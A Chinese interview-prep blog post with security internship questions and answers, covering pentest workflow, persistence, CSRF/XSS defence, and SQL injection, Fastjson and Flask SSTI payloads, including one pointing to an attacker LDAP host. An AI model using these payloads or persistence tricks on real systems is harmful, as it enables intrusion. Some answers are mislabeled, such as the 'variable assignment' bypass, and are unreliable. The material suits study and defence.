---
title: 厂商面试内容
date: 2026-01-02
updated: 2026-01-02
tags:
  - 面试求职
categories:
  - 面试求职
description: None
---
> https://blog.csdn.net/m0_62828084
> https://blog.csdn.net/m0_62828084?type=blog&year=2025&month=03

# 字节

> [250304 字节渗透实习](https://blog.csdn.net/m0_62828084/article/details/146008135)

```txt
1. 渗透流程
2. 信息收集如何处理子域名爆破中的泛解析问题
3. 绕过CDN寻找真实IP
4. PHPINFO页面关注信息
5. 有没有了解权限维持
6. 举例一个漏洞详细描述
7. 输出到href的xss如何防御
8. samesite防御CSRF的原理
9. CSRF的防御
10. json格式的CSRF如何防御
11. 浏览器解析顺序和解码顺序
12. 过滤逗号的sql注入如何绕过
13. 过滤limit后的逗号如何绕过
14. fastjson相关漏洞
15. Python相关的漏洞回答（flask、SSTI原理）
```

## 1. 渗透流程

- 情报收集：
	- 被动收集：Whois 查询、证书透明度日志（CT Logs）、GitHub 代码泄露。
	- 主动探测：子域名爆破（使用 Amass/Sublist3r）、端口扫描（Masscan/Nmap）。
- 漏洞分析：
	- 自动化扫描：AWVS/Nessus 检测常见漏洞（SQLi/XSS）。
	- 手动验证：验证误报漏洞，如逻辑漏洞（越权/支付绕过）。
- 攻击利用：
	- 漏洞利用：通过 Metasploit 或定制化 EXP 攻击目标（如 ThinkPHP RCE）。
	- 权限提升：利用内核漏洞（DirtyCow）或 SUID 提权（`find / -perm -4000`）。
- 权限维持：
	- 植入 WebShell：加密后门（如蚁剑 AES 加密 Shell）。
	- 系统后门：Windows 注册表后门、Linux cronjob 定时任务。
- 横向移动：
	- 内网渗透：利用 Responder 抓取 Net-NTLM 哈希、Pass-The-Hash 攻击。
	- 数据窃取：通过 DNS 隧道或 HTTP 隐蔽信道外传数据。

## 2. 子域名爆破中的泛解析问题处理

泛解析问题：所有未注册子域名解析到同一 IP（如 `*.example.com → 1.1.1.1`）。

解决方案：

- 响应指纹去重：
	- 对比 HTTP 响应头（Server/Cookie）和页面哈希（如 SimHash）。
	- 使用工具（FFUF/GoBuster）的 `-mc` 参数过滤重复状态码。
- 证书透明度日志：
	- 通过 `crt.sh` 查询合法子域名证书记录。
- 历史 DNS 记录：
	- 使用 SecurityTrails/ViewDNS 查询历史 A 记录。
- 字典智能生成：
	- 基于目标业务关键词生成子域（如 `dev/api/test`）。

## 3. 绕过 CDN 寻找真实 IP 的六种方法

- DNS 历史记录：通过 DNSDB 查询目标域名历史解析 IP。
- 全球 Ping 测试：多地服务器（AWS EC2/DigitalOcean）执行 ping 或 curl。
- SSL 证书关联：Censys 搜索相同证书的 IP（`parsed.names:example.com` ）。
- 敏感子域名：访问 `mail.example.com` 或 `internal.example.com` 可能直连真实 IP。
- 邮件服务器追踪：注册目标服务触发邮件，解析邮件头 Received 字段。
- SSRF 漏洞利用：通过目标服务器的 SSRF 漏洞获取内网 IP。

## 4. PHPINFO 页面关键信息审计

- 敏感配置项：
	-  `allow_url_fopen=On`：允许远程文件包含（RFI）。
	-  `disable_functions`：未禁用 `system/shell_exec` 等危险函数。
- 环境变量泄露：
	-  `$_SERVER['DB_HOST']`、`$_ENV['API_KEY']`。
- 临时文件路径：
	-  `upload_tmp_dir` 可能暴露可写目录路径。
- 扩展模块风险：
	- 启用 `imap` 扩展可能导致 CVE-2018-19518 漏洞。

## 5. 权限维持技术详解

- WebShell 持久化：
	- 隐藏文件名：`.config.php` + 修改文件时间戳（`touch -t`）。
- 系统级后门：
	- Windows：注册表键 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` 添加启动脚本。
	- Linux：`/etc/rc.local` 添加反向 Shell 命令。
- 内存驻留马：
	- Java 内存马：通过 JSP 注入 Filter 型内存 Shell。
	- PHP 内存马：利用 `php-fpm` 未授权访问注入。

## 6. 漏洞示例：SQL 注入（以 MySQL 为例）

漏洞原理：未过滤用户输入的 id 参数直接拼接 SQL 语句。

利用 Payload：

```url
/product?id=1' UNION SELECT 1,@@version,3-- -
```


攻击效果：泄露数据库版本、用户权限等敏感信息。

修复方案：

- 使用预编译语句（PDO/MyBatis）。
- 输入过滤：正则匹配 `/[^0-9]/` 限制为数字。

## 7. 输出到 href 的 XSS 防御

漏洞示例：

```html
<a href=" {{ user_input }} ">Link</a> 
<!-- 用户输入为javascript:alert(1) -->
```

防御措施：

- 协议白名单：仅允许 `http://`、`https://`。
- URL 编码：对 href 值进行 HTML 实体编码（如 `&→&amp;`）。
- CSP 策略：设置 `Content-Security-Policy: default-src 'self'`。
- 框架安全：Vue/React 自动转义 href 中的动态内容。

## 8. SameSite 防御 CSRF 原理

- SameSite=Strict：完全禁止跨站请求携带 Cookie（如银行转账）。
- SameSite=Lax：允许 GET 请求携带 Cookie（适用于普通站点）。
- SameSite=None：必须与 Secure 属性共用（仅限 HTTPS）。

## 9. CSRF 防御方案

- Token 验证：表单中嵌入随机 Token（如 Django 的  `{% csrf_token %}`）。
- 双重 Cookie：请求头中携带 Cookie 哈希值（如如 `X-CSRF-Token: hash(cookie)`）。
- Referer 检查：验证请求来源域名是否在白名单内。

## 10. JSON 格式 CSRF 防御

- Content-Type 校验：拒绝非 `application/json` 请求。
- Token 嵌入 JSON：
```json
{"data": "test", "csrf_token": "random_value"}
```
- 禁用 CORS：设置 `Access-Control-Allow-Origin` 为特定域名。

## 11. 浏览器解析与解码顺序

- HTML 解析优先：
	- 解析标签和实体（如 `&lt;` → `<`）。
- JavaScript 执行：
	- 处理 Unicode 转义（如 `\u003c` → `<`）。
- URL 解码：
- 转换 `%20` 为空格。

示例：

```html
<a href="javascript:alert(1%26%23x29;)"></a> 
```

解码顺序：`%26` → `&` → `&#x29;` → `)` → 最终执行 `alert(1)`。

## 12. 过滤逗号的 SQL 注入绕过

场景：`SELECT 1,2,3` 被拦截。

绕过方法：

- JOIN 语法：

```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```

- LIMIT OFFSET：

```sql
UNION SELECT 1 FROM users LIMIT 1 OFFSET 1 
```

## 13. 过滤 LIMIT 逗号的绕过

场景：`LIMIT 0,1` 被拦截。

绕过方法：

- SQL Server 语法：

```sql
SELECT TOP 1 * FROM users 
```

- 变量赋值（MySQL）：

```sql
SELECT * FROM users LIMIT 1 OFFSET 0 
```

## 14. Fastjson 漏洞解析

漏洞根源：反序列化时自动调用 `getter/setter` 方法（如 CVE-2022-25845）。

利用条件：目标开启 autoType 功能。

Payload 示例：

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://attacker.com/exp"} 
```

修复方案：升级到 Fastjson 1.2.83+，关闭 autoType。

## 15. Python 漏洞：Flask SSTI

漏洞原理：未过滤用户输入直接渲染模板。

示例代码：

```python
@app.route('/hello/<name>') 
def hello(name): 
	return render_template_string(f'Hello {name}!') 
```

攻击 Payload：

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

防御措施：

- 使用安全模板引擎（Jinja2 自动转义）。
- 输入过滤：禁止用户输入 {{}} 等特殊字符。

# 阿里云

> [250304 阿里云安全实习](https://blog.csdn.net/m0_62828084/article/details/146008537)

```txt
看你简历上说擅长java、php代码审计，也没有类似的经历能够分享一下，比如说独自审的一套代码或者开源项目，从中发现的一些比较高危的问题。
 
在审计项目的时候，比如一个web网站，简单说说思路。
 
简单描述一下什么是水平越权，什么是垂直越权，我要发现这俩类漏洞，那我代码审计要注意什么地方。
 
解释一下SSRF
 
如何防御SSRF，场景：http://ip/?url=image.jpg
 
场景的内网网段有哪些，他们的掩码是什么
 
教育系统攻防演练，分享一个渗透的例子。
 
除了学校，有没有渗透过别的系统
 
这样的场景（给内网靶标），渗透内网系统的思路。
 
反问环节，岗位做的是阿里云云平台安全，内部安全保障，保障阿里云自身的安全不出问题。整个系统的上线中前后过程，每个方向都有人。
```

1. 代码审计经验与思路

- 实战案例分享
	- Java 反序列化漏洞：审计某开源 CMS 时发现 `ObjectInputStream` 未做白名单过滤，攻击者可构造恶意序列化数据实现RCE（如利用Apache Commons Collections链）。
	- PHP 文件上传绕过：在电商系统中发现未校验文件 MIME 类型及后缀黑名单不完整（如.phtml 未过滤），导致 webshell 上传。
	- 水平越权漏洞：用户查询订单接口未校验 userId 与 Session 绑定，通过修改 URL 参数可遍历他人数据。
- Web 代码审计通用思路
	- 入口点分析：优先检查用户输入层（HTTP 参数、Headers、Cookie）和敏感功能模块（登录、支付、文件上传）。
- 数据流追踪：从 `$_GET/$_POST` 到 SQL 查询/文件操作，验证过滤逻辑（如 `htmlspecialchars` 防 XSS、PDO 预处理防注入）。
- 框架安全配置：检查 Struts2/Spring Security 等组件版本是否存在已知漏洞（如 CVE-2017-5638）。
- 权限控制盲区：全局搜索 isAdmin()、checkPermission()等函数调用是否缺失或逻辑错误。
- 日志与异常处理：观察错误信息泄露（如堆栈跟踪暴露路径）或日志未脱敏（记录明文密码）。

